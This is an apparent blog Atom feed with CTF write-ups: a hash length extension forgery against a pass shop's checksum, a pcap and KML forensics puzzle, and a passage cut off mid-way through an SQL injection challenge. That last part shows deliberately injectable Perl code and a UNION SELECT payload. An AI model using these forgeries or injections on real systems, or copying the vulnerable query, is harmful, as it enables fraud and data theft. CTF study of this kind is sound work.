<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[The Swappage Playground]]></title>
  <link href="http://swappage.github.io/atom.xml" rel="self"/>
  <link href="http://swappage.github.io/"/>
  <updated>2015-01-11T22:27:11+01:00</updated>
  <id>http://swappage.github.io/</id>
  <author>
    <name><![CDATA[Swappage]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[HackIM CTF 2015: Web400 Nullcon Pass Shop]]></title>
    <link href="http://swappage.github.io/blog/2015/01/11/hackim-ctf-2015-web400-nullcon-pass-shop/"/>
    <updated>2015-01-11T22:17:15+01:00</updated>
    <id>http://swappage.github.io/blog/2015/01/11/hackim-ctf-2015-web400-nullcon-pass-shop</id>
    <content type="html"><![CDATA[<p>In this 400 points problem we were asked to buy a Nullcon pass for free.</p>

<p>by opening the web page we were presented with the following scenario</p>

<p><img class="center" src="http://swappage.github.io/images/2015-01-11_web400/webpage.png" /></p>

<!-- more -->

<p>and by clicking the buy button the following form was submitted</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
</pre></td><td class="code"><pre><code class="html"><span class="line">     <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">checkout.php</span> <span class="na">method=</span><span class="s">POST</span><span class="nt">&gt;</span>
</span><span class="line">     <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">hidden</span> <span class="na">name=</span><span class="s">msg</span> <span class="na">value=</span><span class="s">&quot;Nullcon2015%7Ccorporate%7C10999&quot;</span><span class="nt">&gt;&lt;br&gt;</span>
</span><span class="line">     <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">hidden</span> <span class="na">name=</span><span class="s">checksum</span> <span class="na">value=</span><span class="s">&quot;568fe78b29ac377a58ae1fbf02b4d1a158e605b3897916227e4b3ecfc78973db&quot;</span><span class="nt">&gt;&lt;br&gt;</span>
</span><span class="line">
</span><span class="line">	<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">submit</span> <span class="na">value=</span><span class="s">Buy</span><span class="nt">&gt;</span>
</span><span class="line"> <span class="nt">&lt;/form&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>to buy a a pass for free we had to tamper the msg parameter to have the price = 0, but we can’t directly modify the value because its integrity is checked against the checksum value.</p>

<p>If we look at the source code of the page we see the following comment:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
</pre></td><td class="code"><pre><code class="html"><span class="line">   <span class="c">&lt;!-- </span>
</span><span class="line"><span class="c">        </span>
</span><span class="line"><span class="c">        </span>
</span><span class="line"><span class="c">    if( $checksum === hash(&quot;sha256&quot;,$secretkey . $msg))   // secretkey is XXXXXXXXXXXXXXXXXXX    :-P</span>
</span><span class="line"><span class="c">    {</span>
</span><span class="line"><span class="c">      // Success; :)</span>
</span><span class="line"><span class="c">    }</span>
</span><span class="line"><span class="c">   </span>
</span><span class="line"><span class="c">  ?&gt; </span>
</span><span class="line"><span class="c">   --&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>and this reminded me to a really similar problem i solved for picoCTF.</p>

<p>This was definitely a length extension attack against the checksum value, which can be performed because we are provided with the length of the secret key, which is 19 characters.</p>

<p>using hashpump it was possible to create the appropriate tampered token and the corresponding checksum</p>

<pre><code>token: Nullcon2015|corporate|10999%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01p|0
checksum: a2319d6945201a4b9fd67f077248faff2b735297cca2ac10762af65b2c2dca48
</code></pre>

<p>submitting them to the web server resulted in the flag being correctly retrieved:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
</pre></td><td class="code"><pre><code class="html"><span class="line">HTTP/1.1 200 OK
</span><span class="line">Date: Fri, 09 Jan 2015 21:08:38 GMT
</span><span class="line">Server: Apache/2.4.7 (Ubuntu)
</span><span class="line">X-Powered-By: PHP/5.5.9-1ubuntu4.5
</span><span class="line">Vary: Accept-Encoding
</span><span class="line">Content-Length: 114
</span><span class="line">Keep-Alive: timeout=5, max=100
</span><span class="line">Connection: Keep-Alive
</span><span class="line">Content-Type: text/html
</span><span class="line">
</span><span class="line"><span class="nt">&lt;h1&gt;</span> Checkout <span class="nt">&lt;/h1&gt;</span>Congratualtion You bought Nullcon Pass in ZERO rupee. See you at Nullcon!Flag is fl@g_*2o15}
</span></code></pre></td></tr></table></div></figure></notextile></div>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HackIM CTF 2015: Forensics 1]]></title>
    <link href="http://swappage.github.io/blog/2015/01/11/hackim-ctf-2015-forensics-1/"/>
    <updated>2015-01-11T21:12:33+01:00</updated>
    <id>http://swappage.github.io/blog/2015/01/11/hackim-ctf-2015-forensics-1</id>
    <content type="html"><![CDATA[<p>This is the first and supposely easier forensics problem in the NullCon CTF 2015</p>

<p><img class="center" src="http://swappage.github.io/images/2015-01-11_for100/problem.png" /></p>

<p>we were provided with a pcap file, and were asked to identify the hideout of a wanted suspect.</p>

<!-- more -->

<p>I started looking at the pcap file in wireshark, and noticed that there were a bunch of HTTP sessions, at this point i decided to load the pcap file in xplico to make my life easier and to reconstruct the web pages.</p>

<p><img class="center" src="http://swappage.github.io/images/2015-01-11_for100/urls.png" /></p>

<p>By opening the url</p>

<pre><code>http://10.20.31.84/locationlogs/
</code></pre>

<p>we can notice that it’s an http server directory listing and that there are a bunch of files in there.</p>

<p><img class="center" src="http://swappage.github.io/images/2015-01-11_for100/locationlogs_index.png" /></p>

<p>I proceded to save the files on disk and noticed that they were a mix of KML and KMZ files that i could import in google earth.</p>

<p>Many of them were simply a disguise, we were asked to look for a cave, and obviously there was a file <em>dams_forests_caves</em> to attract our attention.</p>

<p>I spent a couple of time trying to figure out which files were there just to increase the <em>noise</em> and which one was the really interesting one.</p>

<p>Since the problem statement said something about monitoring the movements of the suspect, eventually the <em>trace log</em> caught my attention.</p>

<p>It’s definitely a KML file, but it’s intentionally broken as it’s missing the XML headers needed for the KML specification.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
</pre></td><td class="code"><pre><code class="xml"><span class="line"><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
</span><span class="line">  <span class="nt">&lt;Document&gt;</span>
</span><span class="line">    <span class="nt">&lt;name&gt;</span>Timetimetime<span class="nt">&lt;/name&gt;</span>
</span><span class="line">    <span class="nt">&lt;Style</span> <span class="na">id=</span><span class="s">&quot;paddle-a&quot;</span><span class="nt">&gt;</span>
</span><span class="line">      <span class="nt">&lt;IconStyle&gt;</span>
</span><span class="line">        <span class="nt">&lt;Icon&gt;</span>
</span><span class="line">          <span class="nt">&lt;href&gt;</span>http://maps.google.com/mapfiles/kml/paddle/A.png<span class="nt">&lt;/href&gt;</span>
</span><span class="line">        <span class="nt">&lt;/Icon&gt;</span>
</span><span class="line">        <span class="nt">&lt;hotSpot</span> <span class="na">x=</span><span class="s">&quot;32&quot;</span> <span class="na">y=</span><span class="s">&quot;1&quot;</span> <span class="na">xunits=</span><span class="s">&quot;pixels&quot;</span> <span class="na">yunits=</span><span class="s">&quot;pixels&quot;</span> <span class="nt">/&gt;</span>
</span><span class="line">      <span class="nt">&lt;/IconStyle&gt;</span>
</span><span class="line">    <span class="nt">&lt;/Style&gt;</span>
</span><span class="line">...
</span></code></pre></td></tr></table></div></figure></notextile></div>
<p>I quickly fixed it and tried to import it in google Earth for further inspection.</p>

<p>I’ve added the appropriate headers to the file:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
</pre></td><td class="code"><pre><code class="xml"><span class="line"><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
</span><span class="line"><span class="nt">&lt;kml</span> <span class="na">xmlns=</span><span class="s">&quot;http://www.opengis.net/kml/2.2&quot;</span> <span class="na">xmlns:gx=</span><span class="s">&quot;http://www.google.com/kml/ext/2.2&quot;</span> <span class="na">xmlns:kml=</span><span class="s">&quot;http://www.opengis.net/kml/2.2&quot;</span> <span class="na">xmlns:atom=</span><span class="s">&quot;http://www.w3.org/2005/Atom&quot;</span><span class="nt">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>and what i got as result is the following:</p>

<p><img class="center" src="http://swappage.github.io/images/2015-01-11_for100/tracelog.png" /></p>

<p>That placeholder i’ve marked in red seemed really suspicious, and in fact, if you look at the picture that google earth shows nearby we can see</p>

<p><img class="center" src="http://swappage.github.io/images/2015-01-11_for100/cave.png" /></p>

<p>the flag is</p>

<pre><code>flag{md5("pirates cave")}
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Advent 2014 Day 21 : Otp]]></title>
    <link href="http://swappage.github.io/blog/2014/12/24/advent-2014-day-21-otp/"/>
    <updated>2014-12-24T18:26:40+01:00</updated>
    <id>http://swappage.github.io/blog/2014/12/24/advent-2014-day-21-otp</id>
    <content type="html"><![CDATA[<p>otp was a nice (and painful) web challenge in the advent calendar CTF 2014.</p>

<p>We were provided with the source code of the web application and with an URL: the objective was to successfully login to the web site to get the flag.</p>

<!-- more -->

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
<span class="line-number">42</span>
<span class="line-number">43</span>
<span class="line-number">44</span>
<span class="line-number">45</span>
<span class="line-number">46</span>
<span class="line-number">47</span>
<span class="line-number">48</span>
<span class="line-number">49</span>
<span class="line-number">50</span>
<span class="line-number">51</span>
<span class="line-number">52</span>
<span class="line-number">53</span>
<span class="line-number">54</span>
<span class="line-number">55</span>
<span class="line-number">56</span>
<span class="line-number">57</span>
<span class="line-number">58</span>
<span class="line-number">59</span>
<span class="line-number">60</span>
<span class="line-number">61</span>
<span class="line-number">62</span>
<span class="line-number">63</span>
<span class="line-number">64</span>
<span class="line-number">65</span>
<span class="line-number">66</span>
<span class="line-number">67</span>
<span class="line-number">68</span>
<span class="line-number">69</span>
<span class="line-number">70</span>
<span class="line-number">71</span>
<span class="line-number">72</span>
<span class="line-number">73</span>
<span class="line-number">74</span>
<span class="line-number">75</span>
<span class="line-number">76</span>
<span class="line-number">77</span>
<span class="line-number">78</span>
<span class="line-number">79</span>
<span class="line-number">80</span>
<span class="line-number">81</span>
<span class="line-number">82</span>
<span class="line-number">83</span>
<span class="line-number">84</span>
<span class="line-number">85</span>
<span class="line-number">86</span>
<span class="line-number">87</span>
<span class="line-number">88</span>
<span class="line-number">89</span>
<span class="line-number">90</span>
<span class="line-number">91</span>
<span class="line-number">92</span>
<span class="line-number">93</span>
<span class="line-number">94</span>
<span class="line-number">95</span>
<span class="line-number">96</span>
<span class="line-number">97</span>
<span class="line-number">98</span>
<span class="line-number">99</span>
<span class="line-number">100</span>
<span class="line-number">101</span>
<span class="line-number">102</span>
<span class="line-number">103</span>
<span class="line-number">104</span>
<span class="line-number">105</span>
<span class="line-number">106</span>
<span class="line-number">107</span>
<span class="line-number">108</span>
<span class="line-number">109</span>
<span class="line-number">110</span>
</pre></td><td class="code"><pre><code class="perl"><span class="line"><span class="c1">#!/usr/bin/env perl</span>
</span><span class="line"><span class="k">use</span> <span class="nn">Mojolicious::</span><span class="n">Lite</span><span class="p">;</span>
</span><span class="line"><span class="k">use</span> <span class="n">DBI</span><span class="p">;</span>
</span><span class="line">
</span><span class="line"><span class="k">my</span> <span class="nv">$dbh</span> <span class="o">=</span> <span class="n">DBI</span><span class="o">-&gt;</span><span class="nb">connect</span><span class="p">(</span>
</span><span class="line">    <span class="s">&#39;dbi:SQLite:dbname=./otp.db&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">,</span>
</span><span class="line">    <span class="o">+</span><span class="p">{</span>
</span><span class="line">        <span class="n">RaiseError</span>     <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
</span><span class="line">        <span class="n">sqlite_unicode</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line"><span class="p">);</span>
</span><span class="line"><span class="n">app</span><span class="o">-&gt;</span><span class="n">helper</span><span class="p">(</span><span class="n">dbh</span> <span class="o">=&gt;</span> <span class="k">sub </span><span class="p">{</span> <span class="nv">$dbh</span> <span class="p">});</span>
</span><span class="line">
</span><span class="line"><span class="n">get</span> <span class="s">&#39;/&#39;</span> <span class="o">=&gt;</span> <span class="k">sub </span><span class="p">{</span>
</span><span class="line">    <span class="k">my</span> <span class="nv">$c</span> <span class="o">=</span> <span class="nb">shift</span><span class="p">;</span>
</span><span class="line">    <span class="k">my</span> <span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">)</span> <span class="o">=</span> <span class="n">gen_otp</span><span class="p">();</span>
</span><span class="line">    <span class="k">my</span> <span class="nv">$expire</span> <span class="o">=</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">10</span><span class="p">;</span>
</span><span class="line">    <span class="nv">$c</span><span class="o">-&gt;</span><span class="n">dbh</span><span class="o">-&gt;</span><span class="k">do</span><span class="p">(</span><span class="s">&#39;INSERT INTO otp VALUES (?, ?, ?)&#39;</span><span class="p">,</span> <span class="nb">undef</span><span class="p">,</span> <span class="nv">$token</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">,</span> <span class="nv">$expire</span><span class="p">);</span>
</span><span class="line">    <span class="nv">$c</span><span class="o">-&gt;</span><span class="n">render</span><span class="p">(</span><span class="s">&#39;index&#39;</span><span class="p">,</span> <span class="n">token</span> <span class="o">=&gt;</span> <span class="nv">$token</span><span class="p">);</span>
</span><span class="line"><span class="p">};</span>
</span><span class="line">
</span><span class="line"><span class="n">post</span> <span class="s">&#39;/&#39;</span> <span class="o">=&gt;</span> <span class="k">sub </span><span class="p">{</span>
</span><span class="line">    <span class="k">my</span> <span class="nv">$c</span> <span class="o">=</span> <span class="nb">shift</span><span class="p">;</span>
</span><span class="line">    <span class="k">my</span> <span class="nv">$token</span> <span class="o">=</span> <span class="nv">$c</span><span class="o">-&gt;</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;token&#39;</span><span class="p">);</span>
</span><span class="line">    <span class="c1"># tiny firewall, but powerful :P</span>
</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="nv">$token</span> <span class="o">=~</span><span class="sr"> /sqlite/i</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">        <span class="nv">$c</span><span class="o">-&gt;</span><span class="n">render</span><span class="p">(</span><span class="s">&#39;error&#39;</span><span class="p">,</span> <span class="n">message</span> <span class="o">=&gt;</span> <span class="s">&quot;no hack.&quot;</span><span class="p">);</span>
</span><span class="line">        <span class="k">return</span><span class="p">;</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line">    <span class="k">my</span> <span class="nv">$time</span> <span class="o">=</span> <span class="nb">time</span><span class="p">();</span>
</span><span class="line">    <span class="k">my</span> <span class="p">(</span><span class="nv">$expire</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$c</span><span class="o">-&gt;</span><span class="n">dbh</span><span class="o">-&gt;</span><span class="n">selectrow_array</span><span class="p">(</span>
</span><span class="line">        <span class="s">&quot;SELECT ###CENSORED### FROM otp WHERE ###CENSORED### = &#39;$token&#39; AND ###CENSORED### &lt; $time&quot;</span><span class="p">,</span>
</span><span class="line">    <span class="p">);</span>
</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="nv">$expire</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">        <span class="nv">$c</span><span class="o">-&gt;</span><span class="n">render</span><span class="p">(</span><span class="s">&#39;error&#39;</span><span class="p">,</span> <span class="n">message</span> <span class="o">=&gt;</span> <span class="s">&quot;otp expired at $expire&quot;</span><span class="p">);</span>
</span><span class="line">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class="line">        <span class="k">my</span> <span class="nv">$pass</span> <span class="o">=</span> <span class="nv">$c</span><span class="o">-&gt;</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;pass&#39;</span><span class="p">);</span>
</span><span class="line">        <span class="k">my</span> <span class="p">(</span><span class="nv">$ok</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$c</span><span class="o">-&gt;</span><span class="n">dbh</span><span class="o">-&gt;</span><span class="n">selectrow_array</span><span class="p">(</span>
</span><span class="line">            <span class="s">&#39;SELECT 1 FROM otp WHERE ###CENSORED### = ? AND ###CENSORED### = ?&#39;</span><span class="p">,</span> <span class="nb">undef</span><span class="p">,</span> <span class="nv">$token</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">,</span>
</span><span class="line">        <span class="p">);</span>
</span><span class="line">        <span class="nv">$c</span><span class="o">-&gt;</span><span class="n">render</span><span class="p">(</span><span class="s">&#39;auth&#39;</span><span class="p">,</span> <span class="n">ok</span> <span class="o">=&gt;</span> <span class="nv">$ok</span><span class="p">);</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line">    <span class="nv">$c</span><span class="o">-&gt;</span><span class="n">dbh</span><span class="o">-&gt;</span><span class="k">do</span><span class="p">(</span>
</span><span class="line">        <span class="s">&#39;DELETE FROM otp WHERE ###CENSORED### = ?&#39;</span><span class="p">,</span> <span class="nb">undef</span><span class="p">,</span> <span class="nv">$token</span>
</span><span class="line">    <span class="p">);</span>
</span><span class="line"><span class="p">};</span>
</span><span class="line">
</span><span class="line"><span class="k">sub </span><span class="nf">gen_otp</span> <span class="p">{</span>
</span><span class="line">    <span class="nb">open</span> <span class="k">my</span> <span class="nv">$fh</span><span class="p">,</span> <span class="s">&#39;&lt;:raw&#39;</span><span class="p">,</span> <span class="s">&#39;/dev/urandom&#39;</span> <span class="ow">or</span> <span class="nb">die</span> <span class="vg">$!</span><span class="p">;</span>
</span><span class="line">    <span class="nb">read</span> <span class="nv">$fh</span><span class="p">,</span> <span class="k">my</span> <span class="nv">$token</span><span class="p">,</span> <span class="mi">8</span><span class="p">;</span>
</span><span class="line">    <span class="nv">$token</span> <span class="o">=</span> <span class="nb">unpack</span> <span class="s">&#39;H*&#39;</span><span class="p">,</span> <span class="nv">$token</span><span class="p">;</span>
</span><span class="line">    <span class="nb">read</span> <span class="nv">$fh</span><span class="p">,</span> <span class="k">my</span> <span class="nv">$pass</span><span class="p">,</span> <span class="mi">16</span><span class="p">;</span>
</span><span class="line">    <span class="nv">$pass</span> <span class="o">=</span> <span class="nb">unpack</span> <span class="s">&#39;H*&#39;</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">;</span>
</span><span class="line">    <span class="k">return</span> <span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">);</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="n">app</span><span class="o">-&gt;</span><span class="n">start</span><span class="p">;</span>
</span><span class="line"><span class="bp">__DATA__</span>
</span><span class="line">
</span><span class="line"><span class="nv">@@</span> <span class="nv">index</span><span class="o">.</span><span class="n">html</span><span class="o">.</span><span class="n">ep</span>
</span><span class="line"><span class="nv">%</span> <span class="nv">layout</span> <span class="s">&#39;default&#39;</span><span class="p">;</span>
</span><span class="line"><span class="nv">%</span> <span class="nv">title</span> <span class="s">&#39;OTP&#39;</span><span class="p">;</span>
</span><span class="line">
</span><span class="line"><span class="o">&lt;</span><span class="n">form</span> <span class="n">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="o">&gt;</span>
</span><span class="line">  <span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="n">name</span><span class="o">=</span><span class="s">&quot;token&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s">&quot;&lt;%= $token %&gt;&quot;</span> <span class="o">/&gt;</span>
</span><span class="line">  <span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="n">name</span><span class="o">=</span><span class="s">&quot;pass&quot;</span> <span class="o">/&gt;</span>
</span><span class="line">  <span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s">&quot;auth&quot;</span> <span class="o">/&gt;</span>
</span><span class="line"><span class="sr">&lt;/form&gt;</span>
</span><span class="line">
</span><span class="line"><span class="nv">@@</span> <span class="nv">auth</span><span class="o">.</span><span class="n">html</span><span class="o">.</span><span class="n">ep</span>
</span><span class="line"><span class="nv">%</span> <span class="nv">layout</span> <span class="s">&#39;default&#39;</span><span class="p">;</span>
</span><span class="line"><span class="nv">%</span> <span class="nv">title</span> <span class="s">&#39;Authentication | OTP&#39;</span><span class="p">;</span>
</span><span class="line">
</span><span class="line"><span class="nv">%</span> <span class="nv">if</span> <span class="p">(</span><span class="nv">$ok</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line"><span class="sr">&lt;p&gt;</span><span class="n">authentication</span> <span class="n">succeeded</span><span class="o">.&lt;</span><span class="n">br</span> <span class="sr">/&gt;the flag is: ###CENSORED###&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class="line"><span class="nv">%</span> <span class="err">}</span> <span class="nv">else</span> <span class="p">{</span>
</span><span class="line"><span class="sr">&lt;p&gt;</span><span class="n">authentication</span> <span class="n">failed</span><span class="o">.</span><span class="sr">&lt;/p&gt;</span>
</span><span class="line"><span class="nv">%</span> <span class="err">}</span>
</span><span class="line">
</span><span class="line"><span class="err">@@</span> <span class="nv">error</span><span class="o">.</span><span class="n">html</span><span class="o">.</span><span class="n">ep</span>
</span><span class="line"><span class="nv">%</span> <span class="nv">layout</span> <span class="s">&#39;default&#39;</span><span class="p">;</span>
</span><span class="line"><span class="nv">%</span> <span class="nv">title</span> <span class="s">&#39;Error | OTP&#39;</span><span class="p">;</span>
</span><span class="line">
</span><span class="line"><span class="sr">&lt;p&gt;</span><span class="o">&lt;</span><span class="nv">%</span><span class="err">=</span> <span class="err">$</span><span class="nv">message</span> <span class="nv">%</span><span class="err">&gt;&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
</span><span class="line">
</span><span class="line"><span class="nv">@@</span> <span class="nv">layouts</span><span class="o">/</span><span class="n">default</span><span class="o">.</span><span class="n">html</span><span class="o">.</span><span class="n">ep</span>
</span><span class="line"><span class="o">&lt;!</span><span class="n">DOCTYPE</span> <span class="n">html</span><span class="o">&gt;</span>
</span><span class="line"><span class="sr">&lt;html&gt;</span>
</span><span class="line">  <span class="sr">&lt;head&gt;</span>
</span><span class="line">    <span class="sr">&lt;title&gt;</span><span class="o">&lt;</span><span class="nv">%</span><span class="err">=</span> <span class="nv">title</span> <span class="nv">%</span><span class="err">&gt;&lt;/</span><span class="nv">title</span><span class="o">&gt;</span>
</span><span class="line">  <span class="sr">&lt;/head&gt;</span>
</span><span class="line">  <span class="sr">&lt;style&gt;</span>
</span><span class="line"><span class="n">body</span><span class="p">,</span> <span class="n">input</span> <span class="p">{</span>
</span><span class="line">  <span class="n">color:</span> <span class="c1">#fff;</span>
</span><span class="line">  <span class="n">background:</span> <span class="c1">#333;</span>
</span><span class="line">  <span class="n">font</span><span class="o">-</span><span class="n">family:</span> <span class="n">monospace</span><span class="p">;</span>
</span><span class="line">  <span class="n">font</span><span class="o">-</span><span class="n">size:</span> <span class="mi">150</span><span class="nv">%</span><span class="err">;</span>
</span><span class="line"><span class="err">}</span>
</span><span class="line"><span class="err">.</span><span class="nv">container</span> <span class="p">{</span>
</span><span class="line">  <span class="n">width:</span> <span class="mi">100</span><span class="nv">%</span><span class="err">;</span>
</span><span class="line">  <span class="nv">margin</span><span class="o">-</span><span class="n">top:</span> <span class="mi">50</span><span class="n">px</span><span class="p">;</span>
</span><span class="line">  <span class="n">text</span><span class="o">-</span><span class="n">align:</span> <span class="n">center</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line">  <span class="sr">&lt;/style&gt;</span>
</span><span class="line">  <span class="sr">&lt;body&gt;</span>
</span><span class="line"><span class="o">&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s">&quot;container&quot;</span><span class="o">&gt;</span>
</span><span class="line"><span class="o">&lt;</span><span class="nv">%</span><span class="err">=</span> <span class="nv">content</span> <span class="nv">%</span><span class="err">&gt;</span>
</span><span class="line"><span class="err">&lt;/</span><span class="nv">div</span><span class="o">&gt;</span>
</span><span class="line">  <span class="sr">&lt;/body&gt;</span>
</span><span class="line"><span class="sr">&lt;/html&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>To log in the web application we need to submit a password, paired with the token we are provided as an hidden field in the form, and this pair of credentials is valid for 10 seconds: if the token has expired we won’t be able to log in, so what we need to do is to find a way to generate a token and exfiltrate the password generated by the application for that specific token, before it expires.</p>

<p>As it’s possible to observe from the source code, the query at line 31 is dynamic, so it’s possible to perform a SQL injection attack against the application.</p>

<p>By sending a tampered token value in the POST request, it’s possible to notice that we are facing a union based injection attack: infact if we send something like this:</p>

<pre><code>token=' UNION SELECT 1;
</code></pre>

<p>we would be presented with the following output in the web page</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class="html"><span class="line"><span class="nt">&lt;p&gt;</span>otp expired at 1<span class="nt">&lt;/p&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>It would at this point be easy to enumerate the database structure, tables and columns to exfiltrate some valid data, but it would have been too easy; at line 25 we can see</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="perl"><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="nv">$token</span> <span class="o">=~</span><span class="sr"> /sqlite/i</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="nv">$c</span><span class="o">-&gt;</span><span class="n">render</span><span class="p">(</span><span class="s">&#39;error&#39;</span><span class="p">,</span> <span class="n">message</span> <span class="o">=&gt;</span> <span class="s">&quot;no hack.&quot;</span><span class="p">);</span>
</span><span class="line">    <span class="k">return</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>which makes this challenge a real pain. Infact, as the comment suggets, this is a really tiny yet powerful firewall, because to enumerate the database, we’d need to access the sqlite_master table, where metadata about table structure are stored, but guess what? this is filtered and we cant.</p>

<p>So, no table enumeration: we need to find an alternative way to exfiltrate a valid password to log in.</p>

<p>I’m not that good at sql injection attacks, and in fact it took me a while to figure this out, but after a lot of trial and error i learned that column names are not needed to read data from them</p>

<p>I’ve tried the following injection query and eventually it resulted in the last generated password correctly exfiltrated.</p>

